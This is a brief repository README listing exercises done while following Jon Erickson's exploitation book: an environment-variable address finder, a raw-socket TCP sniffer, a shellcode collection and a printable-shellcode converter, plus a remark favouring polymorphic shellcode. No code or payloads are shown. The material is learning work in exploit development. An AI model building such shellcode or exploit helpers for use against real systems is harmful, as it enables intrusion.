# The art
Here are all the implementations I did following along with Jon Erickson's book 

- [getenvaddr](getenvaddr/): A program to get the addresses of env variables of
executables in a predictable way.

- [raw_tcpsniff](raw_tcpsniff/): A basic tcp sniffer implementation using raw
sockets.

- [shellcode](shellcode/): A collection of shellcodes

- [printable_helper](printable_helper/): A program to help transcribing
shellcode to printable bytes. 

## Personal Favourite
There is no competition to polymorphic shellcode...

This nonsensical string could make quite a mess!!!
